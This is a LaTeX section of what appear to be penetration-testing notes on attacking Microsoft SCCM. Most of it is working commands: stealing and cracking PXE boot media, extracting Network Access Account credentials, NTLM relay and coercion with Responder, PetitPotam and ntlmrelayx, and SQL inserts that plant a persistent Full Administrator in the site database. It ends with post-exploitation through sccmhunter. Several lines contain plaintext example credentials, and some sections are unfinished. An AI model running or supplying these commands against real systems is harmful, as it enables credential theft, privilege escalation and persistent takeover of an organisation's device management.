\section{Attacks}

\subsection{PXE exploit}

\subsubsection{Non password protected}
with \verb+pxethiefy+:
\begin{verbatim}
sudo python3 pxethiefy.py explore -i <interface>
sudo python3 pxethiefy.py explore -i <interface> -a <pxe_ip>
\end{verbatim}

with \verb+PXEThief+:
\begin{verbatim}
pxethief.py 1
# or
pxethief.py 2 <target_fqdn>
\end{verbatim}


\subsubsection{Password protected}
If PXE is protected by a password the files will be encrypted, \href{https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module}{this hashcat module} can be used to decrypt the downloaded media file.

with \verb+PXEThief+:
\begin{verbatim}
pxethief.py 1 or pxethief.py 2 <target_fqdn>

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"
"2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var"

tftp -i 192.168.1.9 GET "\SMSTemp\2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"
"2023.07.14.21.38.35.04.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.bcd"

pxethief.py 5 2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var

./hashcat -m 19850 ./hash ./list.txt --force

python3 pxethief.py 3 "2023.07.14.21.38.36.0001.{85E1DEDB-5CB6-4BCC-826B-77D48AC0BE71}.boot.var" Password123
\end{verbatim}



with \verb+pxethiefy+:
\begin{verbatim}
/hashcat -m 19850 ./hash ./list.txt --force
sudo python3 pxethiefy.py decrypt -p <passwor> -f <boot_var_file>
\end{verbatim}


\subsection{Network Access account}


\subsubsection{DPAPI}
It is possible to retrieve the Network Access Accounts (NAA) in the NAA policy which it's sent by the SCCM server and stored on the SCCM client disk encrypted with DPAPI. With SYSTEM access on the client, the credentials can be retrieved:

prerequisites:
\begin{itemize}
    \item local admin on a SCCM client
\end{itemize}

tools:
\begin{itemize}
    \item sharpSCCM
        \begin{verbatim}
        .\sharpscc.exe get secrets
        # NAA, Task Sequences, Collection Variables
        .\sharpsccm.exe local secrets -m wmi
        \end{verbatim}
        
    \item sharpDPAPI
        \begin{verbatim}
        .\sharpDPAPI.exe SCCM
        \end{verbatim}
    \item Impacket SystemDPAPIdump.py (fork \url{https://github.com/clavoillotte/impacket}):
        \begin{verbatim}
        python3 SystemDPAPIdump.py -creds -sccm la_jubeaz:'jubeaz'@architect -target-ip 172.16.0.20
        -userkey USERKEY      \
            dpapi_userkey for SYSTEM (e.g. if previously dumped using secretsdump). \
            If not provided an LSA secrets dump will be performed to retrieve it.
        \end{verbatim}
    \item sccmhunter:
        \begin{verbatim}
        python3 sccmhunter.py dpapi -debug -u la_jubez -p jubeaz -target 172.16.0.20
        \end{verbatim}
        
\end{itemize}


\subsubsection{Computer request}

A computer account has the ability to register itself with the SCCM server and request the encrypted NAA policies, decrypt them, de-obfuscate them and retrieve the NAA's credentials in them. A controlled computer account is needed to send the authenticated request, but the account to spoof doesn't need to be the same. \href{https://blog.xpnsec.com/unobfuscating-network-access-accounts/}{Full explains here}. 

this will create a computer un SCCM devices

using \href{https://github.com/xpn/sccmwtf}{SCCMwtf}
\begin{verbatim}
python sccmwtf.py \
    DESKTOP-2NHHIAVP \
    DESKTOP-2NHHIAVP.haas.local \
    'bran.haas.local' \
    'haas.local\DESKTOP-2NHHIAVP$' \
    'flg9lmKdwiJ8'
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
grep CDATA naapolicy.xml
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

need to set dependencies on last version
\begin{verbatim}
#Create a computer account and request the policies
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto

#To use an already controlled computer account
python3 sccmhunter.py http -debug  -u <user> -p '<password>' -d <domain_fqdn> \
    -mp <sccm_fqdn> -dc-ip <dc_fqdn> -sleep 30 -auto
\end{verbatim}

Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}

\subsubsection{Relay attack}

code not yet merged to \verb+ntlmrelayx.py+ see \href{https://github.com/Tw1sm/impacket/tree/feature/sccm-relay}{sccm-relay}

with poisonning (responder):
\begin{verbatim}
nano Responder.conf (turn off smb and http)
responder -I eth0
\end{verbatim}

or coercion (petitpotam):
\begin{verbatim}
python3 PetitPotam.py -u lowpriv -p Jubeaz12345+- -d haas.local 192.168.2.3 architect.haas.local
\end{verbatim}


\begin{verbatim}
sudo ntlmrelayx.py -t http://bran.haas.local/ccm_system_windowsauth/request \
    --sccm \
    --sccm-device test1 \
    --sccm-fqdn bran.haas.local \
    --sccm-server bran \
    --sccm-sleep 10 \
    -smb2support
\end{verbatim}

To correct:
verb+PermissionError: [Errno 13] Permission denied: '/tmp/key.pem'+


Then decrypt the retrieved hexadecimal blobs:
\begin{verbatim}
python3 policysecretunobfuscate.py <blob_hex_1>
python3 policysecretunobfuscate.py <blob_hex_2>
\end{verbatim}


\subsection{Client Push Installation}

\subsubsection{Automatic installation}
prerequisites:
\begin{itemize}
    \item Automatic Site-Wide Client Push Installation
    \item Allow Connection Fallback to NTLM
\end{itemize}

\begin{itemize}
    \item Option 1: Uninstall the client
    \item Option 2: Downgrade the client version
    \item Option 3: Break the domain trust (delete the all the \verb+HOST/aaa+ spn of the computer account) to force the SCCM Client Push account authentication to fallback to NTLM instead of Kerberos:
\end{itemize}

disable the firewall, delete all admin accounts and start \verb+inveigh+

\subsubsection{triggering on Demand}


\subsection{SCCM Administrator Privilege Escalation}

The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy. This means it is possible to coerce the primary site server authentication and relay it to the database server and obtain an administrative access.
\begin{itemize}
    \item \url{https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf}
    \item \url{https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1}
    \item \url{https://www.thehacker.recipes/ad/movement/sccm-mecm#sccm-site-takeover}
\end{itemize}

\subsubsection{Relay to the site database server}

Retrieve the controlled user SID:
\begin{verbatim}
rpcclient -c "lookupnames USER" $TARGET_IP
    # And convert it in HEX format
from impacket.ldap import ldaptypes
sid=ldaptypes.LDAP_SID()
sid.fromCanonical('sid_value')
print('0x' + ''.join('{:02X}'.format(b) for b in sid.getData()))
\end{verbatim}

Setup a NTLM relay server to MSSQL or SMB:
\begin{verbatim}
# targetting MS-SQL
ntlmrelayx.py -t "mssql://siteDatabase.domain.local" -smb2support -socks

# targeting SMB
ntlmrelayx.py -t "smb://siteDatabase.domain.local" -smb2support -socks
\end{verbatim}

Coerce the primary site server authentication via PetitPotam, PrinterBug ou whatever.
\begin{verbatim}
proxychains mssqlclient.py "DOMAIN/SCCM-Server$"@"siteDatabase.domain.local" -windows-auth
\end{verbatim}


Establish persistance:
\begin{verbatim}
--Switch to site database
use CM_<site_code>

--Add the SID, the name of the current user, and the site code to the RBAC_Admins table
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (<SID_in_hex_format>,'DOMAIN\user',0,0,'','','','','<site_code>');

--Retrieve the AdminID of the added user
SELECT AdminID,LogonName FROM RBAC_Admins;

--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the “All Objects” scope (SMS00ALL), 
--the “All Systems” scope (SMS00001), 
--and the “All Users and User Groups” scope (SMS00004)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');
\end{verbatim}


\subsubsection{Relay to the SMS Provider server}
f the HTTP API is accessible on the SMS Provider server, setup \href{https://github.com/fortra/impacket/pull/1593}{ntlmrelayx with this PR} to add user1 as a new SCCM admin:
\begin{verbatim}
ntlmrelayx.py -t https://smsprovider.domain.local/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\user1" --displayname "DOMAIN\user1" --objectsid <user1_SID>
\end{verbatim}


\subsubsection{Relay from a passive to the active site server}
When high availability in required, it is possible to find a passive site server that will be used only if the active site server stop working. Its machine account must be a member of the local Administrators group on the active site server.

Setup a NTLM relay pointing to the active server and coerce an authentication from the passive server.
\begin{verbatim}
ntlmrelayx.py -t activeServer.domain.local -smb2support -socks
\end{verbatim}

Then, through the proxy socks session, dump the SAM and LSA with secretsdump.The active site server must be a member of the SMS Provider administrators (it is member of the \verb+SMS Admins+ group), its credentials can be used to add a new controlled user to the \verb+Full Admin+ SCCM group.

\begin{verbatim}
python3 sccmhunter.py admin -u activeServer$ -p :<nthash> -ip <SMS_Provider>

() (C:\) >> add_admin controlledUser <controlledUser_SID>
() (C:\) >> show_admins
\end{verbatim}


\subsection{AdminService lateral movement}
The CMPivot service, presents on the MP server, permits to enumerate all the resources (installed softwares, local administrators, hardware specification, and so on) of a computer, or a computer collection, and perform administrative tasks on them. It uses a HTTP REST API, named AdminService, provided by the SMS Provider server which.

With SCCM administrative rights, it is possible to directly interact with the AdminService API, without using CMPivot, for post SCCM exploitation purpose.

\begin{verbatim}
python3 sccmhunter.py admin -u "domain\user1" -p password -ip <site_server_IP>
\end{verbatim}

hen, the help command can be typed in the opened shell to view all the CMPivot commands handled by sccmhunter.
\begin{verbatim}
() C:\ >> help

Documented commands (use 'help -v' for verbose/'help <topic>' for details):

Database Commands
=================
get_collection  get_device  get_lastlogon  get_puser  get_user

Interface Commands
==================
exit  interact

PostEx Commands
===============
add_admin  backdoor  backup  delete_admin  restore  script

Situational Awareness Commands
==============================
administrators  console_users  ipconfig   osinfo    sessions
cat             disk           list_disk  ps        shares  
cd              environment    ls         services  software
\end{verbatim}



\subsection{WSUS}

\href{https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing}{Spoof the WSUS server and hijack the update} if the updates are pushed through HTTP and not HTTPS
